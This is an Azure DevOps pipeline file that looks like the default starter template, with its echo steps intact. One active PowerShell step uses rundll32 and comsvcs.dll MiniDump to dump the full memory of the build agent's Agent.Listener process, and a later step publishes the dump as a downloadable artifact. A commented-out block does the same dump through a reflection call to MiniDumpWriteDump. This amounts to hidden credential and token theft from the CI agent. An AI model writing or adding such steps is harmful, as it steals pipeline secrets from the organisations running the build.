# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- main

pool:
  vmImage: 'ubuntu-latest'

steps:
- script: echo Hello, world!!
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo oops
  displayName: 'Run a multi-line script'

# - task: PowerShell@2
#   inputs:
#     targetType: 'inline'
#     script: |
#       $target = Get-Process Agent.Listener;       #Target process name
#       $outFile = "data.dmp";                    #Output file name
      
#       $WERNativeType = [PSObject].Assembly.GetType("System.Management.Automation.WindowsErrorReporting+NativeMethods");
#       $WERNativeType
#       $DumpMethodInfo = $WERNativeType.GetMethod('MiniDumpWriteDump', [Reflection.BindingFlags]'NonPublic,Static');
      
#       $FileStream = New-Object IO.FileStream($outFile, [IO.FileMode]::Create);
      
#       $Result = $DumpMethodInfo.Invoke(0, @($target.Handle,
#                                           $target.Id,
#                                           $FileStream.SafeFileHandle,
#                                           [UInt32]2,
#                                           [IntPtr]0,
#                                           [IntPtr]0,
#                                           [IntPtr]0));
      
#       $FileStream.Flush();
#       $FileStream.Close();

- task: PowerShell@2
  inputs:
    targetType: 'inline'
    script: |
      $AgentListerPID = Get-Process -name Agent.Listener | select -expand id
      Write-Host $AgentListerPID
      
      rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $AgentListerPID dump_file.bin full

- task: PublishPipelineArtifact@1
  inputs:
    targetPath: 'dump_file.bin'
    artifact: 'Dump'
    publishLocation: 'pipeline'
